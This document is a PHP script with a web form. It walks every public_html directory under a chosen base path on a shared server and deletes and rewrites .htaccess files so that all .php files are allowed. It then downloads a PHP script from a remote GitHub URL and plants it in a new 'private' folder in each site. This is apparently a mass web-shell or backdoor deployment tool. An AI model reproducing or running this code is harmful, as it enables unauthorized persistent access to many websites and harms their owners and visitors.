<?php
// Function to create or replace the .htaccess file in the specified path
function createHtaccessFile($path) {
    $htaccessFilePath = $path . '/.htaccess';

    // If .htaccess file exists, delete it
    if (file_exists($htaccessFilePath)) {
        unlink($htaccessFilePath);
        echo "Deleted existing .htaccess file at: $htaccessFilePath<br>";
    }

    // Define the content for the new .htaccess file
    $htaccessContent = "<FilesMatch \\.php$>\n    Order allow,deny\n    Allow from all\n</FilesMatch>";

    // Write the new .htaccess content to the file
    file_put_contents($htaccessFilePath, $htaccessContent);
    echo "Created new .htaccess file at: $htaccessFilePath<br>";
}

// Function to handle files in each /public_html subdirectory under the base path
function processSubdirectories($basePath, $filename) {
    // Ensure the base path ends with a trailing slash
    $basePath = rtrim($basePath, '/') . '/';

    // Validate base path
    if (!is_dir($basePath)) {
        echo "Invalid path: $basePath<br>";
        return;
    }

    // Traverse subdirectories and go into /public_html for each one
    $subdirectories = glob($basePath . '*', GLOB_ONLYDIR);
    foreach ($subdirectories as $dir) {
        $publicHtmlPath = $dir . '/public_html';

        // Check if the /public_html directory exists
        if (!is_dir($publicHtmlPath)) {
            echo "Skipping: $publicHtmlPath does not exist.<br>";
            continue;
        }

        // Step 1: Delete and recreate the .htaccess file in the /public_html directory
        createHtaccessFile($publicHtmlPath);

        // Step 2: Create the 'private' directory inside /public_html if it doesn't exist
        $privateDir = $publicHtmlPath . '/private';
        if (!is_dir($privateDir)) {
            mkdir($privateDir, 0755, true);
            echo "Created directory: $privateDir<br>";
        }

        // Step 3: Delete and recreate the .htaccess file inside the 'private' directory
        createHtaccessFile($privateDir);

        // Step 4: Download and save the specified file inside the 'private' directory
        $filePath = $privateDir . '/' . $filename;

        // Fetch content from the remote PHP script URL
        $content = file_get_contents('https://raw.githubusercontent.com/cpugpu009/nf/refs/heads/main/nf.php');
        if ($content === false) {
            echo "Error: Unable to fetch the PHP script content.<br>";
            return;
        }

        // Write the content of the PHP script to the file in the 'private' directory
        file_put_contents($filePath, $content);
        echo "File uploaded to: $filePath<br>";
    }
}

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $basePath = trim($_POST['path']);
    $filename = trim($_POST['filename']);

    if (empty($basePath) || empty($filename)) {
        echo "Path and filename are required.<br>";
    } else {
        // First, create or overwrite the .htaccess in the base path
        createHtaccessFile($basePath);
        // Then process each /public_html subdirectory under the base path
        processSubdirectories($basePath, $filename);
    }
}

// Display the current path (default to the server's document root if not specified)
$currentPath = isset($_POST['path']) ? trim($_POST['path']) : $_SERVER['DOCUMENT_ROOT'];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Upload PHP Script and .htaccess</title>
</head>
<body>
    <h3>Current Path: <?php echo htmlspecialchars($currentPath); ?></h3>
    <form method="post" action="">
        <label for="path">Base Path:</label>
        <input type="text" id="path" name="path" required value="<?php echo htmlspecialchars($currentPath); ?>"><br><br>
        <label for="filename">Filename:</label>
        <input type="text" id="filename" name="filename" required><br><br>
        <input type="submit" value="Upload Files">
    </form>
</body>
</html>
